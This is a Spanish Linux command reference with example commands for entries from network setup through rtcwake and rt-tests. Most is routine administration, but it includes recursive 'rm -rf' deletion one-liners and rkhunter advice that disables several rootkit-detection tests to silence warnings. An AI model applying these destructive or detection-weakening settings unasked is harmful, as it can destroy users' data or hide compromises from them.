# nano /etc/network/interfaces
Borrar todo el contenido y susbtituirlo por:
	auto lo
	iface lo inet loopback
	auto eth0
	iface eth0 inet static
	address 192.168.1.10 # IP estática
	netmask 255.255.255.0 # Mascara
	gateway 192.168.1.1 # IP del router
Reiniciar red:
# /etc/init.d/networking restart


redireccionar
Permite direccionar las salidas por pantalla a un archivo.
$ pwd > archivo.txt (mandar la salida de un comando a un archivo. Si archivo.txt existe borra todo el contenido anterior)
$ pwd 1> archivo.txt (lo mismo que el anterior)
$ pwd >> archivo.txt (añadir la salida de un comando a un archivo. Si no existe lo crea)
$ pwd 1>> archivo.txt (lo mismo que el anterior)
$ ls -W 2> error.txt (mandar la salida de errores a un archivo)
$ find / -name passwd 1> si.txt 2> no.txt (mandar la salida estandar a un fichero y la salida de errores a otro)
$ pwd >| archivo.txt (si la opción noclobber [ver] está activada)
$ mail usuario < archivo.txt (mandar un archivo a un usuario por mail)
$ find / -name passwd 1> todo.txt 2>&1 (mandar salida y errores a un mismo archivo)
$ find / -name passwd 2> todo.txt 1>&2 (lo mismo que el anterior)


ree
Verifica si el firmware del pc y la tarjeta de red puede arrancar la máquina en red.
# strings *.rom | grep UNDI > /dev/null && echo "Si puede" || echo No
# ree


reflector
Optimizador del mirrorlist de pacman.
# reflector (Mostrará todos los mirrors de archlinux.org/mirrors/status/json/)
# reflector --sort rate -l 10 -f 5 --save /etc/pacman.d/mirrorlist (Que tome los 5 mejores [f] de los 10 más actualizados [l], los ordene por velocidad de descarga [sort] y que sobreescriba el archivo mirrorlist [save])


regionset
Los discos dvd contienen un código que indica la región geográfica donde el dvd fue publicado imposibilitando que los comprados en unas regiones, puedan reproducirse en otras:
Códigos de región:
	1 Norte América (USA y Canadá)
	2 Europa, Medio-oriente, Sudáfrica y Japón
	3 Sudeste Asiático, Taiwan, Corea
	4 Hispano América, Brasil, Australia, Nueva Zelanda
	5 Antigua URSS (Rusia, Ucrania, etc.), resto de África, India
	6 China
Esta aplicación permite cambiar dicho código del reproductor, no en el disco dvd y en la mayoría de los casos sólo permite hacer 5 cambios y en algunos casos, sólo 2.
# regionset
	regionset version 0.1 -- reads/sets region code on DVD drives
	Current Region Code settings:
	RPC Phase: II
	type: NONE
	vendor resets available: 4
	user controlled changes resets available: 5
	drive plays discs from region(s):, mask=0xFF
	Would you like to change the region setting of your drive? [y/n]:
vendor resets available: 4 (indica el número de cambios disponibles)


reiserfsck
Reparación de particiones reiserfs. Equivalente al fsck -f /dev/sdX de las particiones ext3.
# reiserfsck --rebuild-tree /dev/sda


reisub
Combinación de teclas a usar cuando el sistema se cuelga. Pulsar las teclas  Alt+ImprPant [PetSis] y mientras mantenemos las dos teclas pulsadas teclear la combinación de teclas REISUB. Su significado:
R: Retorna el control al teclado y ratón.
E: Envia a todos los procesos la señal TERM.
I: Envia a todos los procesos la señal KILL.
S: Sincroniza sistemas y unidades montadas.
U: Desmonta todos los sistemas de archivos.
B: Reinicia la máquina.


remove-shell
[debianutils]. Elimina shells de la lista de shells de inicio de sesión. Funciona en los archivos temporales /etc/shells.tmp y /etc/shells.tmp2 para eliminar los shells dados de la lista de shells válidos y copia el resultado en /etc/shells.
$ remove-shell rbash


rename
renombrar archivos
$ rename JPG jpg *.JPG (Renombrará todos los xxxx.JPG a xxxx.jpg)
1.-
Substituir parte del nombre de unos archivos ("DSC") por otro ("Fotos")
	$ ls
	DSC_8362.jpg DSC_8374.jpg  DSC_8378.jpg  DSC_9112.jpg
	$ rename 's/DSC/Fotos/' *.jpg
	$ ls
	Fotos_8362.jpg Fotos_8374.jpg Fotos_8378.jpg Fotos_9112.jpg


renice
(Ver nice). Cambiar la prioridad de un proceso en marcha.
# renice -10 PID


replace
Reemplazar letras o palabras de ficheros.
$ replace a A -- archivo1 archivo2 (“a” por “A” en los dos ficheros)
$ replace files DIRS  --  archivo (“files” por “DIRS” en archivo)
$ replace DIRS dirs files FILES -- archivo (“DIRS” por ”dirs” y “files” por “FILES”)


reportbug
Herramienta diseñada para enviar informes de errores a Debian o a las distribuciones derivadas. reportbug está diseñado para usarse en sistemas con un agente de transporte de correo instalado, como exim o sendmail; sin embargo, puede editarse el archivo de configuración y enviar informes utilizando cualquier servidor de correo disponible.
# reportbug lynx-ssl (Informa un error en el paquete lynx-ssl)
# reportbug --path --filename=ls (Informa un error en el paquete instalado que incluye un programa en su ruta llamado ls)


reset
Restablece la configuración de la terminal cuando al intentar abrir algún fichero se nos ha llenado de caracteres raros. Aunque no veamos el cursor o el prompt, tecleando "reset" y clicar "intro", se restablece la terminal.


resize
Ver las columnas y líneas de la consola.
$ resize


resize2fs
Cambiar la medida de una partición.
# resize2fs /dev/sda3 600M
# resize2fs -p /dev/sda1 45288448K (Otro ejemplo pero que nos muestra el porcentage)


resolvconf
Framework para mantener actualizada la información del sistema sobre servidores de nombres. Se erige en intermediario entre programas que proporcionan esta información (como ifup y ifdown, clientes DHCP, el demonio PPP y servidores de nombres locales) y programas que utilizan esta información (como cachés DNS y bibliotecas de resolución).
$ resolvconf -i eth0 (interfaces y protocolos opcionalmente coincidiendo con el patrón)
$ resolvconf -l eth0 (enumera los archivos resolv.conf)
$ resolvconf -u (actualizar todos los suscriptores. No los actualiza cuando agrega un resolv.conf que coincide con lo que ya tiene para la interfaz)


resolvectl
[systemd-resolve]. Herramienta para la administración de DNSs [Domain Name Service, son los responsables de traducir los nombres de dominio a sus respectivas IPs y viceversa]
# resolvectl statistics (verificar estadísticas DNS)
# resolvectl flush-caches (Vacía todas las cachés de registros de recursos DNS que el servicio mantiene localmente)
# resolvectl status (configuración de DNS global actualmente vigente)
# resolvectl reset-statistics (establece a cero los contadores de estadísticas)
# resolvectl dns (mostrar las dns que se utilizan)
# resolvectl monitor (Mostrar flujo continuo de consultas de resolución de clientes locales y sus respuestas)


resolveip
Buscar el host de una ip o la ip de un host
$ resolveip -s www.google.com


restic
Programa que hace copias de seguridad de forma fácil, simple de configurar, rápido de ejecutar y restaurar, verificable, utiliza criptografíca para garantizar la confidencialidad y con el crecimiento de los datos, las instantáneas adicionales solo almacenan el incremento real.
$ restic init -r /tmp/prueba-restic (inicio del directorio del backup. Pide contraseña y confirmación)
$ restic -r /tmp/prueba-restic backup . (realizar el backup del presente directorio en el especificado con el init. Pide contraseña)
$ restic -r /tmp/prueba-restic snapshots (ver el contenido del directorio de los backups. Pide contraseña)
$ restic -r /tmp/prueba-restic backup . --exclude="*.sh" --exclude-file=logs.txt (excluyendo los .sh y logs.txt)
$ restic -r /srv/prueba-restic diff 9fb7d0ca 3bec06c1 (comparando las diferencias entre dos snapshots)
$ restic -r /tmp/prueba-restic restore 9d0c9446 --target /tmp/restore/ (restaurar un backup en el directorio especificado)


restore
Restaurar una copia de seguridad realizada con dump.
$  restore -rf home.bak (restaurar la copia completa [r] del archivo especificado [f])
$ restore -xaf fichero.bak fichero (restaurar solo la copia del fichero indicado [x], sin preguntar de qué volumen extraer los ficheros y especificando  archivo  [f])


retty
Capturar el proceso que se está ejecutando en otra consola.
$ retty PID
Ejemplo.
En una consola lanzamos el proceso:
$ watch -tn1 'date "+%r %F %A"'
En otra averiguamos el PID:
$ ps aux | grep watch
Y capturamos el proceso:
$ retty PID


rev
invierte una cadena de texto o un archivo
$ echo "perico de los palotes" | rev
$ rev archivo.txt


rfkill
Herramienta para activar/desactivar dispositivos inalámbricos.
# rfkill list (Muestra listado y su estado)
# rfkill block all (bloquear todos [“all”], otras opciones: ”wifi”, “wlan”, “wimax” ….)
# rfkill unblock all (Desbloquear todos los dispositivos)
# rfkill unblock 0 (Desbloquear la 0 según resultado de “list”)


rig
[Random Identity Generator]. Genera datos personales aleatorios pero de apariencia real en inglés. Si se ha bajado de https://github.com/harkaitz/rig-spain el equivalente español ha de especificarse con -d.
$ rig -f -c 5 -d /usr/local/share/rig/spain (genero femenino, 5 opciones de identidad y en español)
$ rig -m -c 5 (del genero masculino y 5 opciones de identidad)


ripgrep
buscar archivos y directorios.
$ rg archivo.mp3
$ rg -A2 archivo.txt (muestra dos lineas despues de la coincidencia)
$ rg -C2 dir (muestra la línea anterior y posterior a la coincidencia)


ripit
Crear archivos mp3 a partir de un cd de música.
$ ripit --device /dev/sr1 (especificando dispositivo)
$ ripit --normalize (Normalizar archivos antes de la codificación)
$ ripit 1,3-5,7-10 (extraer y codificar una selección de pista seleccionadas)
$ ripit --span 0-25 (Copiar solo los primeros 25 segundos de cada pista)


rkhunter
Buscador de rootkits instalados en el sistema
# rkhunter --update  (recargar la base de datos)
# rkhunter --propupd (si se ha modificado la función Hash o para reconstruir la base de datos y evitar "Warnings" tipo: Warning: The file properties have changed)
# rkhunter -c  (iniciar la aplicación)
# rkhunter -c -sk (iniciar la aplicación sin pedir confirmación para proseguir después de cada sección)
# rkhunter -c -sk --rwo (sin mostrar salida excepto los "Warnings")
# rkhunter --list (ver todas las opciones)
# rkhunter --list rootkits (ver el listado se rootkits que busca)
# rkhunter --list tests (listado de chequeos)
# rkhunter --enable group_accounts,system_commands  (solo chequear estas dos opciones)
# rkhunter --disable shared_libs  (descartar esta opción del chequeo)
# cat /var/log/rkhunter.log | grep Warning (visualizar los "Warnings")
# egrep -i "warning:|\[ warning \]" /var/log/rkhunter.log && awk '/System checks summary/ {f=1}f' /var/log/rkhunter.log (otra forma de visualizar "warnings")
# rkhunter -C (ver las últimas modificaciones del archivo de configuración /etc/rkhunter.conf)
1.-
Para solucionar el error: Warning: Hidden directory found: /etc/.java
# nano /etc/rkhunter.conf
Y descomentar la linea:
ALLOWHIDDENDIR="/etc/.java"
Nota.- para errores similares con archivos ocultos [/dev/.udev, /dev/.initramfs... ], descomentar la linea correspondiente.
2.-
Para errores de versión de ciertas aplicaciones [Warning: Application 'gpg', version ....]
# nano /etc/rkhunter.conf
Añadir apps a la linea:
DISABLE_TESTS="suspscan hidden_procs deleted_files packet_cap_apps apps"
3.-
Para suprimir falsa advertencias sobre posibles interfaces promiscuos [P.ejemplo de un servidor virtual], añadir "promisc" a la opción DISABLE_TESTS:
DISABLE_TESTS="suspscan hidden_procs deleted_files packet_cap_apps apps promisc"
4.-
Para que los valores se obtengan del gestor de paquetes correspondiente:
# nano /etc/rkhunter.conf
Y descomentar y modificar la linea PKGMGR:
PKGMGR=DPKG
Nota.- Otras opciones para distros no debian o para desactivar la opción: RPM, BSD,SOLARIS y NONE
5.-
Para evitar la nota: Warning: Suspicious file types found in /dev... añadir a /etc/rkhunter.conf la linea:
	ALLOWDEVFILE=/dev/.../*
Nota.- Substituir los puntos supensivos por el subdirectorio oportuno.
6.-
Evitar el error: Invalid BINDIR configuration option: Not a directory: /snap/bin/kesty-whatsapp
He suprimido el programa que lo causaba:
# snap remove kesty-whatsapp
O dicen que suprimir la ruta al ejecutable /snap/bin/kesty-whatsapp que la tengo en .bashrc
7.-
Para evitar falsos "Warnings" del tipo: Warning: The following suspicious (large) shared memory segments have been found, que significa que existen procesos que usan segmentos de memoria compartida y que pueden comprobarse en el archivo de resultados /var/log/rkhunter.log, colocar en el archivo de configuración /etc/rkhunter.conf:
	ALLOWIPCPROC=/usr/bin/firefox
	ALLOWIPCPROC=/usr/lib/chromium/chromium
	ALLOWIPCPROC=/usr/bin/liferea
	ALLOWIPCPROC=/usr/bin/pcmanfm
	...
Nota.- Pueden especificarse varios.
8.-
Puede que algunas utilidades principales que han sido reemplazadas por scripts produzcan falsas advertencias. Estas que pueden silenciarse a través de la lista blanca en /etc/rkhunter.conf:
	SCRIPTWHITELIST=/usr/bin/egrep
	SCRIPTWHITELIST=/usr/bin/fgrep
	SCRIPTWHITELIST=/usr/bin/which
9.-
Para evitar problemas con el --update tipo:
	Checking rkhunter data files...
	Checking file mirrors.dat        [ Skipped ]
	Checking file programs_bad.dat   [ Update failed ]
	Checking file backdoorports.dat  [ Update failed ]
	Checking file suspscan.dat       [ Update failed ]
	Checking file i18n versions      [ Update failed ]
Editar el archivo de configuración /etc/rkhunter.conf y modificar los apartados siguientes de la forma especificada:
	UPDATE_MIRRORS=1
	MIRRORS_MODE=0
Que por defecto son:
	UPDATE_MIRRORS=0
	MIRRORS_MODE=1
Luego la ejecución de:
# rkhunter --update
dará como resultado algo tipo:
	Checking rkhunter data files...
	  Checking file mirrors.dat                                  [ No update ]
	  Checking file programs_bad.dat                             [ No update ]
	  Checking file backdoorports.dat                            [ No update ]
	  Checking file suspscan.dat                                 [ No update ]
	  Checking file i18n/cn                                      [ Skipped ]
	  Checking file i18n/de                                      [ Skipped ]
	  Checking file i18n/en                                      [ No update ]
	  Checking file i18n/tr                                      [ Skipped ]
	  Checking file i18n/tr.utf8                                 [ Skipped ]
	  ...
10.-
Paquetes opcionales adicionales son: unhide para encontrar procesos y puertos ocultos y skdet (wget http://dvgevers.home.xs4all.nl/skdet/skdet) para verificaciones adicionales de Suckit Rookit.


rkill
[pslist]. Herramienta similar a kill [ver]
$ rkill -9 scribus (Matará la aplicación especificada. Igual que killall [ver])
$ rkill -9 17424 (Matará la aplicación que corra en el PID especificado. Igual que kill)


rl
[randomize-lines]. Muestra lineas de un archivo o de la entrada standard de forma aleatoria.
$ rl /etc/fstab (Forma básica)
$ seq 10 | rl --count 2 (2 números del 0 al 10)
$ rl -n /etc/fstab -o archivo (Numerando las lineas, colocandolas de forma aleatoria y guardando el resultado en "archivo")
$ rl -o archivo -c 5 archivo.txt (Guardar en archivo [-o] 5 lineas [-c] del texto archivo.txt)


rlogin
Conecta con un host remoto
$ rlogin usuario@host


rm
Borrar archivos. Puede que con algunas de las opciones tenga que activarse extglob (shopt -s extglob).
$ rm -R directorio         (Borra directorios y los subdirectorios)
$ rm -i   archivo        (Pide confirmación antes de borrar)
$ rm file1 file2  (Borrar varios archivos)
$ rm -R dir1 dir2 dir3 (Lo mismo con varios directorios)
$ rm -f           (Fuerza eliminación incluso si existen ficheros que no existen)
$ find . -type f -empty -exec rm {} \;  (Elimina todos los archivos vacios de un directorio)
$ rm -v !(*.txt)  (Eliminar todos los archivos menos los .txt)
$ rm -v !(*.txt|*.png) (Elimina todos menos los .txt y .png)
$ rm !(tuto+([1-9]) (Borrar los ficheros excepto del tuto1 al tuto9
1.-
Para que todo lo eliminado con el comando rm vaya a la papelera del sistema:
$ nano .bashrc
Y añadimos el alias:
alias rm='mv -t ~/.local/share/Trash/files'
2.-
Eliminar todo un directorio menos un subdirectorio, por ejemplo menos el dir HTMLS:
	$ ls
	dir3  file1.txt  HTMLS  dirpdfs  file2.txt
	$ ls | grep -v HTMLS | xargs -d"\n" rm -rf
	$ ls
	HTMLS


rmdir
Borra directorios vacios
$ rmdir /home/usuario/dir_vacio
$ find . -type d -empty -exec rmdir {} \; (Otra forma)


robots.txt
Archivo que evita que determinado contenido de un sitio web sea indexado por los motores de búsqueda. Este archivo distingue mayúsculas y minúsculas, puede incluir comentario mediante almohadilla [#] y cada grupo User-agen/Disallow debe de estar separado por una linea en blanco.
Algunos comandos:
User-agent (Indica qué tipo de robot debe cumplir con la directiva que se indica)
	User-agent: * (Incluir todos los buscadores)
	User-agent: Googlebot (Especificar el buscador de Google)
	User-agent: Bingbot (Especificar el robot de Bing)
Disallow  (Niega el acceso a un directorio, un archivo o una página)
	Disallow: (Permite la entrada a todo el sitio)
	Disallow: / (Denegar todo el sitio)
	Disallow: /directorio/ (Denegar un directorio)
	Disallow: /restringido*/ (Denegar directorios que comienzan por "restringido")
	Disallow: /pagina.html (Denegar una página)
	Disallow: /*.png$ (Denegar los archivos que terminen con la extensión .png)
Allow (Permitir el acceso a directorios, archivos o páginas)
	Allow: /directorio/subdirectorio/ (Permitir un subdirectorio)
Sitemap (Indica la ruta a un mapa del sitio en XML)
	Sitemap: http://web.com/sitemap.xml
Crawl-delay (Indica número de segundos que debe esperar para cada acceso a cada página)
	Crawl-delay: 30
Aspecto que puede presentar un archivo robots.txt:
	User-agent: wget
	Disallow: /
	\\ linea en blanco
	User-agent: grub-client
	Disallow: /
	\\ linea en blanco
	User-agent: *
	Disallow:
	\\ linea en blanco
	Sitemap: https://tractatuslapipaplena.herokuapp.com/sitemap.xml


ronn
Construye páginas man. Convierte archivos de texto en markdown a roff para visualización en terminales y también a HTML para la web.
$ man 7 ronn-format (define cada parte del formato de una página man)
$ ronn archivo.md (crea la página de manual archivo y archivo.html)
$ ronn --html --style=dark file.md (crea la versión man en html con fondo negro del md especificado)


root-tail
Programa que muestra y sigue el contenido más reciente de uno o más archivos de registro y utiliza el fondo de escritorio para mostrar las salidas.
$ journalctl -f | root-tail - (canalizar systemd a root-tail)
$ root-tail /var/log/firewalld (uso básico)
$ root-tail -font 10x20 /var/log/postgresql/postgresql-15-main.log,green -font 12x24 /var/log/firewalld,red,'ALERT'


rotatelogs
Programa de rotación de logs de apache en función de un intervalo de tiempo o tamaño máximo del registro. Es un demonio que se ejecuta de forma autónoma.
# logrotate -vf /etc/logrotate.conf (comprobar el correcto funcionamiento de forma manual rotando todos los registros)


rotix
Permite generar ofuscaciones rotacionales.
$ rotix -a -t "linux es un sistema genial"
$ rotix -f archivo.txt -o otro_archivo.txt (ofusca un archivo y lo guarda en otro_archivo.txt)


route
Mostrar/manipular la tabla de enrutamiento ip.
$ route -n
$ route add default gw 192.168.1.50 (Establecer los protocolos de conexión después de levantar una red manualmente con ifconfig)
# route add --host 192.168.0.12 eth0 (agregar un host a una tabla de enrutamiento)
# route add -host IP reject (bloquear una IP)
# route del IP reject (desbloquear una ip)
$ route del -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.10 (Eliminar una puerta de enlace)
$ route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1 (Crear una nueva puerta de enlace)


routef
Refresca las tablas de enrutado [ver routel]
# routef


routel
Componente de ip route para listar las tablas de enrutado. [ver routef]
$ routel


rpcinfo
Para saber los servicios que estan en marcha
$ rpcinfo -p


rpl
Utilidad de búsqueda y reemplazo que cambia cadenas con cadenas nuevas en varios archivos de texto al mismo tiempo.
$ rpl -i -w 'más' 'menos' docs/file_* (Reemplaza todos los "más" sin importar mayúsculas o minúsculas por "menos" en los archivos "file_*" en el directorio docs/)
$ rpl -m -w 'mala cosa' 'excelente caso' docs/file_* (Ignorar mayúsculas y minúsculas al buscar, pero intentar hacer coincidir las mayúsculas y minúsculas del reemplazo)
$ rpl -i -- '-x3' '+x5' docs/file_* (si una de las cadenas comienza con "-", se debe colocar "--" como último argumento ANTES de la cadena)


rpm
Gestor de paqueteria de distros basadas en Red Hat.
# rpm -ivh paquete (instalar un paquete)
# rpm -ivh –nodeeps paquete (instalar paquete rpm ignorando dependencias)
# rpm -e paquete (eliminar paquete)
# rpm -qa (Listar todos los paquetes instalados)
# rpm -qi paquete (información de un paquete)
# rpm -q paquete --whatrequires (listar dependencias de un paquete)
# rpm -qf /etc/httpd/conf/httpd.conf (A qué paquete pertenece un archivo)
# rpm --checksig paquete (verificar integridad de un paquete)
# rpm -qa gpg-pubkey (verificar la integridad de todos los paquetes)


rrenice
[pslist]. Herramienta con uso igual que renice [ver]


rsnapshot
Script en Perl y basado en rsync que realiza copias de seguridad manualmente o mediante cron [ver].
# cp /etc/rsnapshot.conf.default /etc/rsnapshot.conf (Copiar el archivo de configuración)
# rsnapshot configtest (Comprobar la correctas configuración de la herramienta)
# rsnapshot du (ver el espacio ocupado por las copias de seguridad)
# rsnapshot -V diff daily.0 daily1 (ver las diferencias entre dos copias de seguridad)
# rsnapshot -t hourly (no genera el backup sinó un sumulacro para comprobar que todo funciona)
Ejemplo de archivo de configuración:
# nano /etc/rsnapshot.conf
	snapshot_root   /backup/ # directorio donde se guardan las copias
	cmd_cp		/bin/cp # rutas a los ejecutables
	cmd_rm		/bin/rm
	cmd_rsync	/bin/bin/rsync
	cmd_du		/usr/bin/du
	cmd_rsnapshot_diff		/usr/bin/rsnapshot-diff
	logfile	/var/log/rsnapshot.log # ruta a los logs de la aplicación
	backup /home/ localhost/ # backups de nuestra home y guardados en localhost [/backup/]
	retain hourly 6 (copia cada hora y se almacenan las últimas 6)
	retain daily 7 (copia cada dia y se almacenan las últimas 7)
	retain weekly 4 (cada semana y se almacenan las últimas 4)
	retain monthly 6 (cada mes y se almacenan las últimas 6)
	retain yearly 5 (cada año y se almacenan las últimas 5)


rssh
Shell restrictiva que permite elegir el método de acceso de un usuario que se desea entre las opciones disponibles: scp, sftp, cvs, svn, rsync o rdist. Primero incluir la nueva shell como una shell válida en del sistema:
# echo "/usr/bin/rssh" >> /etc/shells
Crear un usuario con la shell restrictiva:
# useradd -d /home/externo -m extern
# nano /etc/passwd
Y colocar la linea:
	extern:x:1001:1001:extern,,,:/home/externo:/usr/bin/rssh
A continuacion descomentar la o las opciones permitidas:
# nano /etc/rssh.conf
	allowscp
	allowsftp
	allowcvs
	#allowrdist
	allowrsync
	allowsvnserve


rsstail
Mostrar noticias rss en estilo multitail
$ rsstail -n 1 -d -u http://web.com -u http://web1.com -u http://web3.com
Algunas opciones:
-n 1  (Actualizar cada segundo)
-d     (Mostrar descripción)
-z      (Continuar incluso con errores xml)
-l      (Mostrar enlaces)
-u URL (Host del feed)


rsync
Sincronizar archivos o directorios. Trabajar con el directorio montado. En las rutas a copiar, no colocar * si queremos tambien copiar ficheros y directorios ocultos.
$ rsync -av /home/usuario/Dropbox /home/usuario/Copias_seguridad/ (Copiar todo el directorio “Dropbox” en el directorio “Copias_seguridad”)
$ rsync -av --exclude=Dropbox /media/servidor /home/usuario/servidor/ (Sincronizar un servidor con un directorio local excluyendo el dir Dropbox)
Nota.- Pueden excluirse varios directorios [--exclude=Dropbox --exclude=isos --exclcude=public ...]
$ rsync -arvuz Documentos usuario@192.168.1.5:/home/usuario/ (Copiar el directorio en otra máquina)
$ rsync -arvuz -e 'ssh -p 30567' Documentos usuario@192.168.1.5:/home/usuario/ (Copiar el directorio en otra máquina pero especificando otro puerto SSH)
Algunas opciones:
	-a (respaldar recursivamente directorios y subdirectorios)
	-g (conserva el atributo “group” de los archivos originales)
	-E (conserva el atributo “executable” del archivo originales)
	-v (aumentar el nivel de información desplegado)
	-z (comprime los datos que serán transferidos)
	-h (mostrar salida entendible para humanos)
	--exclude=tmp  (Excluir archivos o directorios. /tmp en este caso)
	--delete-during  (Borrar los archivos de origen a medida que son transferidos)
$ rsync -aHxv root@dirección_IP:/ /carpeta_destino --exclude=/dev --exclude=/proc --exclude=/sys --exclude=/tmp (copia/clonación en vivo de todo un sistema remoto a un directorio local. Se recomienda parar todos los servicios en ejecución de la máquina remota y repetir el comando varias veces hasta que no haya ningún fichero copiado, para evitar ficheros corrompidos. Se deben crear las carpetas "/dev", "/proc", "/sys" y "/tmp" en la carpeta de destino).
$ rsync -avz --exclude-from 'rsync_exclude' /home/usuario/ /media/sda11/copa_seguridad (Copia de seguridad del /home/usuario a otra partición excluyendo los archivos especificados en el archivo rsync_exclude)
Nota.- El formato del archivo rsync_exclude para excluir los ficheros ocultos [.*] todos los de la carpeta Dropbox y el video alien de la carpeta Videos será:
	.*
	Dropbox/*
	Videos/alien


rsyslog
Demonio responsable de recopilar mensajes provenientes de las aplicaciones y el kernel y enviarlos a los archivos de registro, almacenados generalmente en el directorio /var/log/. Los mensaje de las aplicaciones están asociadas a unos subsistemas; auth y authpriv [para autentificación], cron [tareas programadas], demon [afecta a algún demonio], ftp [al servidor FTP], kern [proveniente del kernel], lpr [proviene del subsistema de impresión], mail [del subsistema de correo electrónico], news [mensaje del subsistema Usenet], syslog [mensajes del propio servidor syslogd], user [mensajes de usuario genérico], uucp [del servidor UUCP] y local0 a local7 [reservado para uso local] y tambien estan asociados a un nivel de prioridad: emerg [emergencia extrema del sistema], alert [alerta importante], crit [condición critica], err [error], warn [advertencia, posible error], notice [aviso importante], info [mensaje informacivo] y debug [mensaje de depuración]
Modificar el archivo:
# nano /etc/rsyslog.conf
Desconmentando las lineas:
  module(load="imudp")
  input(type="imudp" port="514")
  module(load="imtcp")
  input(type="imtcp" port="514")
Que todos los mensajes de alerta se manden a los usuarios “root” y “USER”
  *.alert      root,USER
Comprobar si el archivo de configuración está correcto:
# rsyslogd -N1 -f /etc/rsyslog.conf
Para que los cambios surtan efecto reiniciar el servicio:
# systemctl restart rsyslog
Verificar que el servicio rsyslog esté escuchando en los puertos especificados.
# ss -tunlp | grep 514# rsyslogd -dn (modo debug)
# rsyslogd -n (de forma interactiva)
# rsyslogd -dn (modo debug)


rtacct
Monitorear los contadores snmp del kernel y las estadísticas de la interfaz de red cuyo contenido se encuentra en /proc/net/rt_acct.
# rtacct -a -s -z (volcar valores absolutos, no actualizar el historial y mostrar tambien los contadores a cero)
# rtacct -n (solo actualizar el historial)
# rtacct -d 5 (ejecutar en modo daemon y recolectando las estadisticas cada 5 segundos)


rtc
[Real Time Clock]. Dispositivo que se encarga de mantener la hora y fecha del sistema actualizados incluso cuando este está apagado. Para comprobar si el pc tiene RTC:
# grep -i rtc /boot/config-6.1.0-13-amd64 (substituir por el kernel real instalado lanzando el comando: uname -r)
...
CONFIG_RTC_HCTOSYS_DEVICE="rtc0"
...
# cat /sys/class/rtc/rtc0/wakealarm (verificar si hay algún arranque configurado. Si no devuelve ningún valor significa que no se ha configurado ningún arranque)
Para probar si el arranque programado funciona, primero se restablece el arranque a cero y luego se establece que arranque el pc en 3 minutos al cerrar:
# echo 0 > /sys/class/rtc/rtc0/wakealarm
# echo `date '+%s' -d '+ 3 minutes'` > /sys/class/rtc/rtc0/wakealarm
Si ahora volvemos a lanzar:
# /sys/class/rtc/rtc0/wakealarm
Nos da un número parecido a 1699298144 que son la cantidad de segundos transcurridos desde la medianoche UTC del 1 de enero de 1970 [inicio de la época unix] hasta el momento que se lanza el comando. A los 3 minutos de cerrar el pc ha de reiniciarse. Más información sobre el driver rtc:
$ cat /proc/driver/rtc


rtcwake
Entrar en un estado de suspensión del sistema hasta la hora de activación especificada.
# rtcwake -m show -v (Mostar si una suspensión o arranque está activo o no)
# rtcwake -m mem -s 10 (suspender la RAM y reiciciar en 10 segundos)
# rtcwake -m no -l -t `date +%s -d 'today 18:30:00'` ([-m no] no suspender, [-l] hardware configurado en hora local y [-t] hora de arrancar, hoy a las 6,30 de la tarde)
# rtcwake -m disk -u -s 60 (-u asume que el reloj del hardware está configurado en UTC, [-m disk] suspende en disco y -s lo reactiva un minuto después [en segundos])
# rtcwake --list-modes
Los modos son los siguientes:
    freeze (Procesos congelados, dispositivos suspendidos y procesadores inactivos. Ahorra menos energía porque el sistema está ejecución)
    mem (Suspensión a RAM. Ahorra energía ya que el sistema se pone en un estado de bajo consumo, excepto la memoria para conservar su contenido.
    disk (Suspensión en disco. Mayor ahorro de energía. Similar a suspender en RAM, pero incluye escribir el contenido de la memoria en el disco)
    off (Poweroff. Esto se hace llamando a /sbin/shutdown. No cuenta con el apoyo oficial de ACPI, pero normalmente funciona)
    no (No suspender, solo configurar la hora de activación RTC)
    on (No suspender, pero lee el dispositivo RTC hasta que aparezca la hora de activación)
    disable (Desactiva una activación previamente configurada)
    show (Imprima la información de la alarma en formato: "alarm: off|on <time>". Por ejemplo, "alarm: on Tue Nov 16 04:48:45 2010")
Nota.- La opción -a lee de forma automática la configuración del reloj del hardware esté configurado en UTC [-u] o en hora local [-l]. Este es el valor predeterminado.
# rtcwake -m mem -s 120 && firefox (suspende el pc a RAM, la activa dos minutos más tarde y luego inicia Firefox)
# rtcwake -m disk --date +15min (Suspender en disco y reactivarse 15 minutos después)
# rtcwake -m freeze --date 202311051230 (Congele el sistema y recupérelo en una fecha y hora determinadas [2023/11/05 12:30])
# rtcwake -m disable (Desactivar una alarma previamente configurada)
# rtcwake -m on --date 20:30 (Realizar ensayo para reactivar la computadora en un momento determinado. Cancelar con Ctrl+c)
La marca de tiempo puede ser cualquiera de las siguientes:
   AAAAMMDDhhmmss
   AAAA-MM-DD hh:mm:ss
   AAAA-MM-DD hh:mm (los segundos se establecerán en 00)
   AAAA-MM-DD (la hora se establecerá en 00:00:00)
   hh:mm:ss (la fecha será hoy)
   hh:mm (la fecha se establecerá en hoy, los segundos en 00)
   tomorrow (la hora está establecida en 00:00:00)
   +5min


rtkitctl
[realtimekit]. Servicio del sistema D-Bus que cambia la política de programación de los hilos y procesos de usuario a modo de programación en tiempo real, a petición del usuario. Está concebido para ser utilizado como un mecanismo seguro que permita la programación en tiempo real para ser utilizado por los procesos normales.
# rtkitctl --reset-known (restablecer el estado en tiempo real de los hilos conocidos)
# rtkitctl --reset-all (restablecer el estado en tiempo real de todos los hilos)
# rtkitctl --start (iniciar rtkitctl si aún no se está ejecutando)
# rtkitcrl --exit (finalizar la ejecución del demonio RealtimeKit)


rtla
Comando para analizar las propiedades en tiempo real del sistema. rtla utiliza capacidades de seguimiento del kernel para proporcionar información precisa sobre las propiedades y las causas fundamentales de resultados inesperados.
# rtla osnoise (información sobre el ruido del sistema operativo)
# rtla timerlat (Mide la IRQ y la latencia del temporizador de subprocesos)


rtmon
Permite guardar/monitorizar la tabla de rutas.
# rtmon file /var/log/rtmon.log (guardar en un fichero)
Dado que el fichero estará en formato binario ha de visualizarse con:
# ip monitor file /var/log/rtmon.log


rtorrent
Descarga de archivos a partir de torrents
$ rtorrent url.torrent


rt-tests
